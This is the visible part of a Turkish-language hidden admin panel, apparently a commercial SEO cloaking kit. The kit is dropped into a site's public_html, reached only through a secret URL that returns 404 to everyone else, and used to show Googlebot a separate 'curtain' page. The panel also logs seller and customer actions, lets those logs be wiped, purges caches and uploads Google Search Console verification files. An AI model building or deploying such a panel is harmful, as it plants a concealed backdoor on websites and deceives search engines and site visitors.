          <span id="preview-size" style="opacity:.55;font-weight:normal;letter-spacing:0;text-transform:none;margin-left:6px;"></span>
        </div>
        <iframe id="perde-preview" sandbox="allow-scripts allow-same-origin" title="Perde önizleme"></iframe>
      </div>
    </div>

    <div style="margin-top:10px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;">
      <div style="display:flex;gap:6px;flex-wrap:wrap;">
        <button class="btn btn-green" onclick="saveHtml()">DEĞİŞİKLİKLERİ KAYDET</button>
        <button class="btn" id="preview-toggle-btn" onclick="togglePreview()">◉ ÖNİZLEMEYİ GİZLE</button>
      </div>
      <span id="save-msg" style="font-size:11px;color:var(--gold);font-weight:bold;"></span>
    </div>
  </div>

  <!-- GSC DOĞRULAMA KARTI -->
  <div class="card">
    <h2>🔍 Google Search Console Doğrulama</h2>
    <div class="guide-box" style="margin-bottom:14px;">
      <p>Google Search Console'dan indirdiğin <b>googleXXXXXXXX.html</b> dosyasını buradan yükle — ana dizine otomatik kaydedilir.</p>
      <p style="margin-top:8px;"><b>⚠ Zorunlu:</b> Dosya adı <code style="color:#f85149;">.html</code> ile bitmek zorunda.
      Örnek: <code>googlea9c195d5359e1a9f.html</code></p>
      <p style="margin-top:6px;"><b>İçerik formatı</b> (ikisi de geçerli):<br>
      &nbsp;&nbsp;• <code>google-site-verification: googlea9c195d5359e1a9f</code><br>
      &nbsp;&nbsp;• <code>google-site-verification: googlea9c195d5359e1a9f.html</code></p>
    </div>
    <div id="gsc-existing" style="margin-bottom:10px;"></div>
    <div style="display:flex;flex-direction:column;gap:8px;max-width:520px;">
      <div>
        <label style="font-size:12px;color:#8b949e;display:block;margin-bottom:4px;">Dosya adı — <b style="color:#f85149;">.html uzantısı zorunlu</b>:</label>
        <input type="text" id="gsc-filename" placeholder="googlea9c195d5359e1a9f.html"
               style="width:100%;background:#0d1117;border:1px solid #30363d;color:#e6edf3;padding:7px 10px;border-radius:5px;font-size:13px;box-sizing:border-box;">
      </div>
      <div>
        <label style="font-size:12px;color:#8b949e;display:block;margin-bottom:4px;">Dosya içeriği (Google'dan kopyala):</label>
        <input type="text" id="gsc-content" placeholder="google-site-verification: googlea9c195d5359e1a9f.html"
               style="width:100%;background:#0d1117;border:1px solid #30363d;color:#e6edf3;padding:7px 10px;border-radius:5px;font-size:13px;box-sizing:border-box;">
      </div>
      <div style="display:flex;gap:8px;align-items:center;">
        <button class="btn btn-blue" onclick="uploadGsc()">⬆ Yükle</button>
        <span id="gsc-msg" style="font-size:12px;font-weight:bold;"></span>
      </div>
    </div>
  </div>

  <!-- İŞLEM GEÇMİŞİ -->
  <div class="card">
    <h2 style="display:flex;align-items:center;justify-content:space-between;">
      <span>İşlem Geçmişi &amp; IP Logları</span>
      <button onclick="openClearLogModal()" style="font-size:11px;padding:4px 12px;background:#2d1010;color:#f85149;border:1px solid #5a1a1a;border-radius:4px;cursor:pointer;">🗑 Logları Sıfırla</button>
    </h2>
    <div style="max-height:200px;overflow-y:auto;">
      <table>
        <thead>
          <tr>
            <th style="width:130px;">Zaman</th>
            <th style="width:100px;">Rol</th>
            <th style="width:140px;">İşlem</th>
            <th>Detay</th>
          </tr>
        </thead>
        <tbody id="log-body"></tbody>
      </table>
    </div>
  </div>

  <!-- KILAVUZ -->
  <div class="card">
    <h2>Kullanım Özeti</h2>
    <div class="guide-box" style="display:grid;grid-template-columns:1fr 1fr;gap:12px 24px;">
      <div>
        <p><b>🚀 Kurulum</b></p>
        <p>Dosyayı <code>public_html</code> kök dizinine yükle → tarayıcıdan aç → ekrandaki <b>gizli linki</b> kaydet. Başka hiçbir şey yapma, sistem kendi kurulur.</p>
      </div>
      <div>
        <p><b>🔐 Panel Girişi</b></p>
        <p>Her zaman kaydettiğin tam linki kullan (<code>?nc_k=…&nc_t=…</code>). Parametreler yanlışsa 404 döner — normal ziyaretçiler paneli göremez.</p>
      </div>
      <div>
        <p><b>🟢 CLOAK AÇ / KAPAT</b></p>
        <p>Üstteki büyük butona bas. Kapattığında F5'te kendiliğinden açılmaz — sen açana kadar kapalı kalır.</p>
      </div>
      <div>
        <p><b>📄 DEĞİŞİKLİKLERİ KAYDET</b></p>
        <p>Perde editöründe düzenleme yap → kaydet. Sağda canlı önizleme var. Schema/JSON-LD ekleyebilirsin. ÖNİZLEMEYİ GİZLE ile editörü genişletebilirsin.</p>
      </div>
      <div>
        <p><b>🩺 TEŞHİSİ YENİLE / AKILLI TAM ONAR</b></p>
        <p>Sayfa açılışında teşhis otomatik çalışır. Sorun çıkarsa <b>AKILLI TAM ONAR</b> butonu belirir — tek tıkta düzeltir. PHP-FPM'de değişiklikler ~5 dk sonra aktif olur.</p>
      </div>
      <div>
        <p><b>🤖 GOOGLEBOT TESTİ / ZENGİN SONUÇLAR</b></p>
        <p>GOOGLEBOT TESTİ ile sistemin gerçekten çalışıp çalışmadığını test et. ZENGİN SONUÇLAR ↗ ile Google'ın yapısal veri aracını aç.</p>
      </div>
      <div>
        <p><b>🧹 CACHE TEMİZLE</b></p>
        <p>Perde değişikliği sonrası çalıştır. WP transient, LiteSpeed, yönetilen host önbelleklerini temizler. .htaccess yazılamıyorsa chmod 644 uygula.</p>
      </div>
      <div>
        <p><b>🔍 GSC Doğrulama</b></p>
        <p>Google Search Console'dan aldığın <code>googleXXX.html</code> kodunu yapıştır → <b>⬆ Yükle</b>. Dosya kök dizine yazılır, GSC'den doğrulamayı başlat. Yüklenen dosyaları <b>× Sil</b> ile kaldır.</p>
      </div>
    </div>
  </div>
</div><!-- /wrap -->

<script>
var PK = <?= json_encode($pk) ?>;

/* ============================================================
   checkStatus — artık gerçekten UI'ı güncelliyor
   ============================================================ */
function applyStatusUI(d) {
    var st  = document.getElementById('status-text');
    var btn = document.getElementById('toggle-btn');
    if (d.active) {
        st.innerText   = 'AKTİF (Çalışıyor)';
        st.style.color = '#3fb950';
        btn.className  = 'btn btn-green';
    } else if (d.paused) {
        st.innerText   = 'DURDURULDU (Kasıtlı)';
        st.style.color = '#d29922';
        btn.className  = 'btn btn-amber';
    } else {
        st.innerText   = 'PASİF (Durduruldu)';
        st.style.color = '#f85149';
        btn.className  = 'btn btn-danger';
    }
}

function checkStatus() {
    fetch('?' + PK + '&a=status&_=' + Date.now())
    .then(r => r.json())
    .then(d => { applyStatusUI(d); loadLogs(); })
    .catch(function () { loadLogs(); });
}

/* ==================== LOG SIFIRLAMA MODAL ==================== */
function openClearLogModal() {
    /* Modal overlay */
    var ov = document.createElement('div');
    ov.id = 'clr-modal';
    ov.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.7);z-index:9999;display:flex;align-items:center;justify-content:center;';

    ov.innerHTML = '<div style="background:#161b22;border:1px solid #5a1a1a;border-radius:10px;padding:28px 32px;min-width:300px;max-width:400px;width:90%;box-shadow:0 8px 32px rgba(0,0,0,0.6);">'
        + '<h3 style="margin:0 0 6px;color:#f85149;font-size:15px;">🗑 Logları Sıfırla</h3>'
        + '<p style="margin:0 0 18px;color:#8b949e;font-size:13px;">Tüm kayıtlar silinecek. Devam etmek için şifreyi girin.</p>'
        + '<input id="clr-pass" type="password" placeholder="Şifre" autocomplete="off" '
        +   'style="width:100%;box-sizing:border-box;background:#0d1117;border:1px solid #30363d;color:#e6edf3;border-radius:5px;padding:8px 12px;font-size:14px;margin-bottom:16px;outline:none;">'
        + '<div id="clr-err" style="display:none;color:#f85149;font-size:12px;margin-bottom:10px;"></div>'
        + '<div style="display:flex;gap:10px;justify-content:flex-end;">'
        +   '<button onclick="closeClearLogModal()" style="padding:6px 18px;background:#21262d;color:#e6edf3;border:1px solid #30363d;border-radius:5px;cursor:pointer;font-size:13px;">İptal</button>'
        +   '<button onclick="doLogClear()" style="padding:6px 18px;background:#da3633;color:#fff;border:none;border-radius:5px;cursor:pointer;font-size:13px;font-weight:600;">Sıfırla</button>'
        + '</div>'
        + '</div>';

    document.body.appendChild(ov);
    /* ESC ile kapat */
    ov._esc = function(e) { if (e.key === 'Escape') closeClearLogModal(); };
    document.addEventListener('keydown', ov._esc);
    setTimeout(function(){ var el=document.getElementById('clr-pass'); if(el) el.focus(); }, 80);
}

function closeClearLogModal() {
    var ov = document.getElementById('clr-modal');
    if (ov) { document.removeEventListener('keydown', ov._esc); ov.remove(); }
}

function doLogClear() {
    var pass = document.getElementById('clr-pass');
    var errEl = document.getElementById('clr-err');
    if (!pass || !pass.value.trim()) {
        errEl.textContent = 'Şifre boş olamaz.'; errEl.style.display = 'block'; return;
    }
    var fd = new FormData();
    fd.append('pass', pass.value);
    fetch('?' + PK + '&a=clear_logs', { method: 'POST', body: fd })
    .then(r => r.json())
    .then(function(d) {
        if (d.success) {
            closeClearLogModal();
            loadLogs();
        } else {
            errEl.textContent = d.msg || 'Hata.';
            errEl.style.display = 'block';
            pass.value = '';
            pass.focus();
        }
    })
    .catch(function() {
        errEl.textContent = 'Sunucu hatası.'; errEl.style.display = 'block';
    });
}

function loadLogs() {
    fetch('?' + PK + '&a=get_logs&_=' + Date.now())
    .then(r => r.json())
    .then(d => {
        var body = document.getElementById('log-body');
        var html = '';
        if (d.logs && d.logs.length > 0) {
            d.logs.forEach(function(l, idx) {
                var isOwner = l.type === 'owner';

                /* Satır renk paleti */
                var rowBg      = isOwner ? 'rgba(31,64,128,0.10)' : 'rgba(90,66,8,0.10)';
                var rowBorder  = isOwner ? '1px solid rgba(88,166,255,0.10)' : '1px solid rgba(210,153,34,0.10)';
                var rowHover   = isOwner ? 'rgba(31,64,128,0.22)' : 'rgba(90,66,8,0.22)';
                var timeColor  = isOwner ? '#6e9fd4' : '#b08d3a';
                var actionColor= isOwner ? '#79c0ff' : '#e3b341';
                var detailColor= isOwner ? '#6e9fd4' : '#a07830';
                var arrowColor = isOwner ? '#3a6ea8' : '#7a5e18';

                /* IP + rozet */
                var ipHtml = isOwner
                    ? '<span style="font-size:11px;color:#58a6ff;background:#0d1e35;padding:3px 10px;border-radius:3px;border:1px solid #1f4080;font-weight:600;">SATICI</span>'
                    : '<span style="font-size:11px;color:#d29922;background:#1a1200;padding:3px 10px;border-radius:3px;border:1px solid #5a4208;font-weight:600;">MÜŞTERİ</span>';

                var detailId = 'log-detail-' + idx;
                var hasDetail = l.details && l.details.trim() !== '';
                var arrow = hasDetail ? ' <span style="font-size:9px;color:' + arrowColor + ';">▼</span>' : '';

                html += '<tr style="background:' + rowBg + ';border-bottom:' + rowBorder + ';cursor:' + (hasDetail?'pointer':'default') + ';transition:background .15s"'
                     + ' onmouseover="this.style.background=\'' + rowHover + '\'"'
                     + ' onmouseout="this.style.background=\'' + rowBg + '\'"'
                     + ' onclick="toggleLogDetail(\'' + detailId + '\')">'
                     + '<td style="color:' + timeColor + ';font-size:11px;padding:7px 10px;white-space:nowrap;">' + l.time + '</td>'
                     + '<td style="padding:7px 10px;">' + ipHtml + '</td>'
                     + '<td style="padding:7px 10px;"><b style="color:' + actionColor + ';">' + l.action + '</b>' + arrow + '</td>'
                     + '<td style="color:' + detailColor + ';max-width:260px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;padding:7px 10px;">' + escHtml(l.details) + '</td></tr>';

                if (hasDetail) {
                    var detailBg = isOwner ? '#080f1f' : '#110d00';
                    var detailBorder = isOwner ? '#1f4080' : '#5a4208';
                    html += '<tr id="' + detailId + '" style="display:none;">'
                         + '<td colspan="4" style="padding:10px 16px;background:' + detailBg + ';border-top:1px solid ' + detailBorder + ';border-bottom:' + rowBorder + '">'
                         + '<div style="font-size:11px;color:' + detailColor + ';white-space:pre-wrap;word-break:break-word;line-height:1.7;">' + escHtml(l.details) + '</div>'
                         + '</td></tr>';
                }
            });
        } else {
            html = '<tr><td colspan="4" style="text-align:center;color:#8b949e;">Henüz log kaydı yok.</td></tr>';
        }
        body.innerHTML = html;
    });
}

function toggleLogDetail(id) {
    var row = document.getElementById(id);
    if (!row) return;
    row.style.display = row.style.display === 'none' ? 'table-row' : 'none';
}

function escHtml(s) {
    if (!s) return '';
    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

/* ============================================================
   Sistem Sağlığı & Teşhis
   ============================================================ */
function loadDiagnosis(silent) {
    var container = document.getElementById('health-container');
    var smartBtn  = document.getElementById('smart-fix-btn');
    var diagStatus= document.getElementById('diag-status');
    var refreshBtn= document.getElementById('diag-refresh-btn');

    container.innerHTML = '<div style="font-size:12px;color:#8b949e;">Teşhis yükleniyor... <span class="spinner">⟳</span></div>';
    smartBtn.style.display = 'none';
    diagStatus.innerText   = '';
    refreshBtn.disabled    = true;

    /* silent=true → sayfa yüklemesi, log yazılmaz; silent=false/undefined → buton, log yazılır */
    fetch('?' + PK + '&a=full_diagnosis&nolog=' + (silent ? '1' : '0') + '&_=' + Date.now())
    .then(r => r.json())
    .then(d => {
        refreshBtn.disabled = false;
        var diag   = d.diag;
        var health = diag.health;
        var color  = health >= 80 ? '#3fb950' : (health >= 50 ? '#d29922' : '#f85149');
        var label  = health >= 80 ? 'MÜKEMMEL'  : (health >= 50 ? 'SORUNLU' : 'KRİTİK');

        var html = '';
        /* Health bar */
        html += '<div>';
        html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">';
        html += '<span style="font-size:13px;font-weight:bold;color:' + color + ';">Sistem Sağlığı: %' + health + ' — ' + label + '</span>';
        html += '<span style="font-size:11px;color:#8b949e;">' + diag.fixable + ' düzeltilebilir sorun tespit edildi</span>';
        html += '</div>';
        html += '<div class="health-bar-bg"><div class="health-bar-fill" style="width:' + health + '%;background:' + color + ';"></div></div>';
        html += '</div>';

        /* Kontrol tablosu */
        html += '<table><thead><tr><th style="width:190px;">Kontrol Noktası</th><th style="width:55px;">Durum</th><th>Mesaj</th></tr></thead><tbody>';
        diag.checks.forEach(c => {
            var icon, cls;
            if (c.ok) {
                icon = '✓'; cls = 'check-ok';
            } else if (c.severity === 'warning') {
                icon = '⚠'; cls = 'check-warn';
            } else {
                icon = '✗'; cls = 'check-fail';
            }
            html += '<tr>'
                 + '<td style="font-size:11px;">' + c.label + '</td>'
                 + '<td><span class="' + cls + '">' + icon + '</span></td>'
                 + '<td style="font-size:11px;">' + c.msg + '</td>'
                 + '</tr>';
        });
        html += '</tbody></table>';
        container.innerHTML = html;

        if (diag.fixable > 0) {
            smartBtn.style.display = 'inline-block';
            diagStatus.innerText   = diag.fixable + ' sorun akıllı onarımla düzeltilebilir.';
            diagStatus.style.color = '#d29922';
        } else {
            diagStatus.innerText   = 'Tüm kontroller geçti — sistem %100 sağlıklı.';
            diagStatus.style.color = '#3fb950';
        }
        loadLogs();
    })
    .catch(function (e) {
        refreshBtn.disabled = false;
        container.innerHTML = '<div style="color:#f85149;font-size:12px;">⚠ Teşhis isteği başarısız: ' + e + '<br>Sayfayı yenileyin veya hosting sunucusu yanıt vermiyor.</div>';
    });
}

function runSmartFix() {
    var smartBtn  = document.getElementById('smart-fix-btn');
    var diagStatus= document.getElementById('diag-status');
    smartBtn.innerText  = 'Onarılıyor...';
    smartBtn.disabled   = true;
    diagStatus.innerText= 'Akıllı onarım uygulanıyor...';

    fetch('?' + PK + '&a=smart_fix', { method: 'POST' })
    .then(r => r.json())
    .then(d => {
        /* Onarım raporunu göster */
        var container = document.getElementById('health-container');
        var reportHtml = '<div class="fix-report"><b style="color:#58a6ff;font-size:11px;">⚡ Onarım Raporu:</b>';
        if (d.fixes && d.fixes.length > 0) {
            d.fixes.forEach(f => {
                var ok  = f[0], msg = f[1];
                reportHtml += '<div class="fix-report-line" style="color:' + (ok ? '#3fb950' : '#f85149') + ';">'
                            + (ok ? '✓' : '✗') + ' ' + msg + '</div>';
            });
        }
        reportHtml += '</div>';
        container.innerHTML = reportHtml + container.innerHTML;

        smartBtn.innerText = '⚡ AKILLI TAM ONAR';
        smartBtn.disabled  = false;

        /* 2 saniye sonra teşhisi yenile */
        setTimeout(function () {
            checkStatus();
            loadDiagnosis();
        }, 2000);
    })
    .catch(function () {
        smartBtn.innerText = '⚡ AKILLI TAM ONAR';
        smartBtn.disabled  = false;
    });
}

/* ============================================================
   toggleCloak — buton rengi/durum metni güncelleniyor
   ============================================================ */
function toggleCloak() {
    var btn = document.getElementById('toggle-btn');
    var prevText = btn.innerText;
    btn.innerText  = 'İşleniyor...';
    btn.disabled   = true;

    fetch('?' + PK + '&a=toggle_cloak', { method: 'POST' })
    .then(r => r.json())
    .then(d => {
        btn.disabled  = false;
        btn.innerText = 'CLOAK AÇ / KAPAT';   /* metni her zaman sıfırla */
        var m = document.getElementById('resp-msg');
        m.style.display     = 'block';
        m.style.borderColor = d.active ? '#3fb950' : (d.paused ? '#d29922' : '#f85149');
        m.innerText = d.msg;
        /* Anında UI güncelle */
        applyStatusUI(d);
        loadLogs();
        setTimeout(function(){ loadDiagnosis(true); }, 1500); /* otomatik yenileme — log yazma */
    })
    .catch(function () {
        btn.innerText = 'CLOAK AÇ / KAPAT';   /* hata durumunda da sıfırla */
        btn.disabled  = false;
    });
}


/* ======== CANLI ÖNİZLEME ======== */
var _previewTimer = null;
var _previewOn    = true;

function updatePreview() {
    if (!_previewOn) return;
    var ta = document.getElementById('perde-html');
    var frame = document.getElementById('perde-preview');
    if (!ta || !frame) return;
    var html = ta.value;
    frame.srcdoc = html;
    var sizeEl = document.getElementById('preview-size');
    if (sizeEl) sizeEl.innerText = (html.length / 1024).toFixed(1) + ' KB';
}

function schedulePreview() {
    clearTimeout(_previewTimer);
    _previewTimer = setTimeout(updatePreview, 320);
}

function togglePreview() {
    var pane = document.getElementById('preview-pane');
    var btn  = document.getElementById('preview-toggle-btn');
    _previewOn = !_previewOn;
    pane.style.display = _previewOn ? '' : 'none';
    btn.innerText = _previewOn ? '◉ ÖNİZLEMEYİ GİZLE' : '◉ ÖNİZLEMEYİ GÖSTER';
    if (_previewOn) updatePreview();
}

/* Textarea her değişince önizleme güncelle */
(function () {
    var ta = document.getElementById('perde-html');
    if (ta) ta.addEventListener('input', schedulePreview);
})();

/* ======== HTML KAYDET ======== */
function saveHtml() {
    var content = document.getElementById('perde-html').value;
    var sm      = document.getElementById('save-msg');
    sm.innerText   = 'Kaydediliyor...';
    sm.style.color = '#8b949e';

    var fd = new FormData();
    fd.append('a', 'save_html');
    fd.append('content', content);
    fd.append('p', '<?= $provided_p ?>');

    fetch('?' + PK, { method: 'POST', body: fd })
    .then(r => r.json())
    .then(d => {
        sm.innerText   = d.msg;
        sm.style.color = d.success ? '#3fb950' : '#f85149';
        loadLogs();
        setTimeout(function () { sm.innerText = ''; sm.style.color = '#58a6ff'; }, 3500);
    });
}

function runDeepPurge() {
    fetch('?' + PK + '&a=deep_purge&_=' + Date.now())
    .then(r => r.json())
    .then(d => {
        var m = document.getElementById('resp-msg');
        m.style.display = 'block';
        m.style.borderColor = '#58a6ff';
        m.innerText = d.msg;
        loadLogs();
    });
}

function runRealBotTest() {
    var box = document.getElementById('test-box');
    var res = document.getElementById('test-res');
    var pre = document.getElementById('test-pre');
    box.style.display = 'block';
    res.style.color   = '#d29922';
    res.innerText     = 'Bot testi yapılıyor (~10 sn)...';
    pre.innerText     = '...';

    fetch('?' + PK + '&a=real_bot_test&_=' + Date.now())
    .then(r => r.json())
    .then(d => {
        var a = d.audit;
        var titleLine = a.seen_title ? ' | Başlık: "' + a.seen_title + '"' : '';
        if (a.matched) {
            res.style.color = '#3fb950';
            res.innerText   = '✓ BAŞARILI: Googlebot perdeyi görüyor (HTTP: ' + a.http_code + ')' + titleLine;
        } else {
            res.style.color = '#f85149';
            res.innerText   = '✗ BAŞARISIZ (HTTP: ' + a.http_code + ')' + titleLine + ': '
                            + (a.reasons ? a.reasons.join(' | ') : '');
        }
        pre.innerText = a.preview || '(boş yanıt)';
        loadLogs();
        /* Teşhis tablosunu güncelle — önbellek artık yazıldı (sessiz — log yazma) */
        setTimeout(function(){ loadDiagnosis(true); }, 500);
    })
    .catch(function() {
        res.style.color = '#f85149';
        res.innerText   = '✗ Bağlantı hatası — sunucu yanıt vermedi.';
    });
}

function openRichResultsTest() {
    var siteUrl = window.location.protocol + '//' + window.location.host + '/';
    window.open('https://search.google.com/test/rich-results?url=' + encodeURIComponent(siteUrl), '_blank');
}

/* Otomatik yenileme — her 60 saniyede status kontrol */

/* ============================================================
   GSC Doğrulama
   ============================================================ */
function loadGscStatus() {
    fetch('?' + PK + '&a=get_gsc_status&_=' + Date.now())
    .then(r => r.json())
    .then(d => {
        var el = document.getElementById('gsc-existing');
        if (!el) return;
        if (!d.files || d.files.length === 0) {
            el.innerHTML = '<p style="font-size:12px;color:#8b949e;">Henüz yüklenmiş GSC doğrulama dosyası yok.</p>';
            return;
        }
        var html = '<div style="margin-bottom:8px;">';
        d.files.forEach(function(f) {
            html += '<div style="display:flex;align-items:center;gap:8px;padding:6px 10px;background:#0d1117;border:1px solid #238636;border-radius:5px;margin-bottom:5px;">'
                  + '<span style="font-size:11px;color:#3fb950;">✓</span>'
                  + '<code style="font-size:12px;color:#58a6ff;">' + f.name + '</code>'
                  + '<span style="font-size:11px;color:#8b949e;flex:1;">' + f.content + '</span>'
                  + '<button class="btn btn-danger" style="padding:2px 10px;font-size:11px;" onclick="deleteGsc(this.dataset.fn)" data-fn="' + f.name + '">&times; Sil</button>'
                  + '</div>';
        });
        html += '</div>';
        el.innerHTML = html;
    });
}

function uploadGsc() {
    var filename = document.getElementById('gsc-filename').value.trim();
    var filecontent = document.getElementById('gsc-content').value.trim();
    var msg = document.getElementById('gsc-msg');
    msg.style.color = '#8b949e';
    msg.innerText = 'Yükleniyor...';
    fetch('?' + PK + '&a=save_gsc', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'filename=' + encodeURIComponent(filename) + '&filecontent=' + encodeURIComponent(filecontent)
    })
    .then(r => r.json())
    .then(d => {
        msg.style.color = d.success ? '#3fb950' : '#f85149';
        msg.innerText = d.msg;
        if (d.success) {
            document.getElementById('gsc-filename').value = '';
            document.getElementById('gsc-content').value = '';
            loadGscStatus();
        }
    })
    .catch(function() { msg.style.color='#f85149'; msg.innerText='Sunucu hatası.'; });
}

function deleteGsc(filename) {
    if (!confirm(filename + ' silinsin mi?')) return;
    fetch('?' + PK + '&a=delete_gsc', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'filename=' + encodeURIComponent(filename)
    })
    .then(r => r.json())
    .then(d => { alert(d.msg); loadGscStatus(); });
}

setInterval(checkStatus, 60000);

window.onload = function () {
    checkStatus();
    loadDiagnosis(true);   /* Sayfa açılışında sessiz teşhis — log yazmaz */
    updatePreview();   /* Perde editörü ilk önizleme */
    loadGscStatus();   /* GSC dosya durumu */
};
</script>
</body>
</html>
